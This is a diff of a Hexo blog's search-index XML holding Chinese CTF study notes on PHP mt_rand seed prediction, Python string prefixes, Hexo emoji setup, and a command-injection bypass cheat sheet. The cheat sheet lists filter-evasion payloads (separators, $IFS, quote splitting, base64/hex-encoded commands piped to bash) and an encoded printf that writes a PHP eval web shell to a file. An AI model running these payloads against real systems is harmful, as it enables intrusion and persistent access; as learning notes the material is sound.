-  </entry>
-  <entry>
-    <title>php伪随机数漏洞</title>
-    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
-<a id="more"></a>
-<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
-<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
-<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
-<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
-<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
-<p>这张图能帮助我们更好的了解php伪随机数</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
-<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
-<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
-<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
-<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
-那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
-<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
-<p>kali下，进入目录，make</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
-<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
-<p>可以得到种子</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
-<p>验证种子是否一样就是看 输出的序列是否一样</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
-<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
-<p>平台：ctfshow    web入门  web25</p>
-<p>下面放出 此题的wp ：</p>
-<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
-<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>php伪随机数漏洞</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ping命令执行及bypass</title>
-    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
-    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
-<a id="more"></a>
-<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
-<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
-<blockquote>
-<p><code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
-<blockquote>
-<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
-<p>使用下面两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
-<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
-$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
-加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
-不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
-<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
-<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
-<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
-<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
-<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
-<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
-<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
-<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
-<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
-<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
-<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
-<blockquote>
-<p>more:一页一页的显示档案内容<br>
-less:与 more 类似<br>
-head:查看头几行<br>
-tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
-tail:查看尾几行<br>
-nl：显示的时候，顺便输出行号<br>
-od:以二进制的方式读取档案内容<br>
-vi:一种编辑器，这个也可以查看<br>
-vim:一种编辑器，这个也可以查看<br>
-sort:可以查看<br>
-uniq:可以查看<br>
-file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
-<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
-<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
-<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
-<hr>
-<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
-<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
-<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1216,6 +1111,111 @@ regex也有以上六种用法</p>
 </ul>
 <p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
 ]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ping命令执行及bypass</title>
+    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
+    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
+<a id="more"></a>
+<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
+<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
+<blockquote>
+<p><code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
+<blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
+<p>使用下面两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
+<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
+$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
+不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
+<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
+<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
+<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
+<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
+<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
+<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
+<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
+<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
+<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
+<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容</p>
+</blockquote>
+<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
+<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
+<hr>
+<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
+<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>编程学习</category>
         <category>python</category>
@@ -2766,6 +2766,1462 @@ payload:</p>
       <categories>
         <category>web技术学习</category>
         <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Hexo中使用emoji表情</title>
+    <url>/2021/01/15/Hexo%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
+    <content><![CDATA[<h1>Hexo中使用emoji表情</h1>
+<p>Hexo 开启欢乐的 emoji 之旅 💛</p>
+<p>Hexo 默认的 markdown 渲染引擎不支持将 Github emoji 渲染到静态的 html 页面中，我们换一个支持 emoji 的引擎，再增加一个 emoji 插件即可.</p>
+<h2 id="🌞-安装"><a class="header-anchor" href="#🌞-安装">¶</a>🌞 安装</h2>
+<p>命令行如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPYnpm un hexo-renderer-marked --save</span><br><span class="line">npm i hexo-renderer-markdown-it --save</span><br><span class="line">npm install markdown-it-emoji --save</span><br></pre></td></tr></table></figure>
+<p>Tips：据说 <a href="https://github.com/hexojs/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a> 的速度要比 Hexo 原装插件要快，而且功能更多</p>
+<h2 id="🌞-配置"><a class="header-anchor" href="#🌞-配置">¶</a>🌞 配置</h2>
